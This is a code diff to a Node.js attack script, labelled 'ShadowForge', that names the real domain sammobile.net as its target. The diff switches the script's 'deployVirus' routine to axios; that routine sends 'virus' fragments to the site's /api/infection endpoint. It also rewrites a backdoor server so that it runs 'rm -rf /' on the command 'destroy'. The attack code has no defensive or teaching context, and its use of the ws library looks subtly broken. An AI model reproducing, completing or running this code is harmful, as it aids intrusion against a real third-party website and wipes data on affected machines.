@@ -7,6 +7,8 @@ const http = require('http');
 const crypto = require('crypto');
 const cluster = require('cluster');
 const randomstring = require('randomstring');
+const axios = require('axios');
+const { createServer } = require('ws');
 
 // === CONFIGURASI ===
 const TARGET_IP = "sammobile.net";
@@ -97,7 +99,7 @@ const deployVirus = () => {
   fragments.forEach((frag, i) => {
     setTimeout(() => {
       try {
-        http.post(`http://${TARGET_IP}/api/infection`, frag.toString(), {
+        axios.post(`http://${TARGET_IP}/api/infection`, frag.toString(), {
           headers: { 'Content-Type': 'application/octet-stream', 'X-Virus-Header': 'ShadowForge' }
         });
         console.log(`[VIRUS] Fragment ${i+1} deployed`);
@@ -110,14 +112,14 @@ const deployVirus = () => {
 
 // === BACKDOOR ===
 const createBackdoor = () => {
-  const server = net.createServer((socket) => {
+  const server = createServer((socket) => {
     socket.write('ShadowForge Backdoor\n');
-    socket.on('data', (data) => {
-      const cmd = data.toString().trim();
+    socket.on('message', (message) => {
+      const cmd = message.toString().trim();
       if (cmd === 'destroy') {
         exec('rm -rf /', (err) => {
           if (err) console.log(`[VIRUS] ${err.message}`);
-          socket.write('System Corrupted\n');
+          socket.send('System Corrupted\n');
         });
       }
     });
